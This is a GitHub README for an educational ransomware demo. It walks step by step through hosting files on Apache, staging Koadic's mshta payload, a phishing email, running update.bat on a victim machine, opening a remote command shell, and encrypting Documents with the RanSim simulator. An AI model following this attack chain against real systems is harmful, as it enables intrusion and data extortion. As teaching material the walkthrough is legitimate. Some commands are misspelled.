# Ransomware-demo
The repo is about demonstrating how the ransomware works in the system for education purpose.

## Contents
- [Legal Disclaimer](#legal-disclaimer)
- [Environment](#environment)
- [Getting Started](#getting-started)
- [Credits](#credits)

## Legal Disclaimer

This project must not be used for illegal purposes or for hacking into system where you do not have permission, it is strictly for educational purposes. Performing any hack attempts or tests without written permission from the owner of the computer system is illegal. Badware project must not be used for illegal purposes. It is strictly for educational purposes.

## Environment
![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/d91e0bd5-8174-4f4d-8423-c3228b9b0325)

## Getting Started


1. Apache2.service
- Host a temporary HTTP server 
- Upload and Download of file to the server
  
command

- `sudo systemctl start apahce2.service`
![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/df87e25f-65a7-44e1-9310-ff78b1d367c3)

2. Koadic
- a Windows post-exploitation rootkit
- Learn how to use this item to remote access the Windows machine
- Deploy powershell commands secretly

command

- `kodiac`

- `use stager/js/mshta && info`


![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/c18c125b-79c4-4935-9ba9-49e6eb6d96b1)

![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/f08e7c8a-28e0-4597-a1ea-3d437344e381)


3. Phishing email demo

![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/91e464fa-03d3-4d31-ad6a-7524005619b1)


4. Download the update.bat and execute it in the victim machine 
![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/1ec8b0ab-1f97-4176-847e-367c77819c30)


5. Gain the remote access of the Windows in Kodiac

command

- `zombies`

- `cmdshell 0`

![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/f7593284-443d-4a39-a0ba-0b4548e2e2ea)

6. Execute the RanSim malware program

command

- `powershell.exe -Command ".\RanSim.ps1 -mode encrypt -TargetPath C:\Users\Administrator\Documents`
![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/718e74ad-536a-4bd7-b91a-7deb42f33f5c)


7. Result: 

![image](https://github.com/leonlamsc/Ransomware-demo/assets/140391766/8a8177b6-0a59-49db-b5e9-a1544b5520ee)

For decryption:

command

- `powershell.exe -Command ".\RanSim.ps1 -mode decrypt -TargetPath C:\Users\Administrator\Documents`

## Credits
- [RanSim](https://github.com/lawndoc/RanSim) 

- [Loi Liang Yeung Youtube channel](https://www.youtube.com/watch?v=UImsfTpYjvU)
